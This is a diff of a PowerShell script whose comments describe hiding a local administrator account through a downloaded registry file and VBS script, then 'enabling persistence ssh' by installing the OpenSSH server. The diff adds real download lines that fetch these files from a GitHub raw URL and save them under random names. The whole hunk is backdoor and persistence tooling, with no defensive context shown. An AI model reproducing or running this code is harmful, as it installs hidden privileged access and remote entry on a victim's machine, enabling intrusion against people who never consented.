@@ -38,10 +38,12 @@ mkdir $path
 cd $path
 
 # registry to hide local admin
-Invoke-WebRequest -Uri GitHub Link of Registry.reg -OutFile "Registry.reg"
+$reg_file = random_text
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/Registry.reg "$reg_file.reg"
 
 # visual basic script to register the registry
-Invoke-WebRequest -Uri GitHub Link of confirm.vbs -OutFile "confirm.vbs"
+$vbs_file = random_text
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/confirm.vbs "$vbs_file.vbs"
 
 #enabling persistence ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
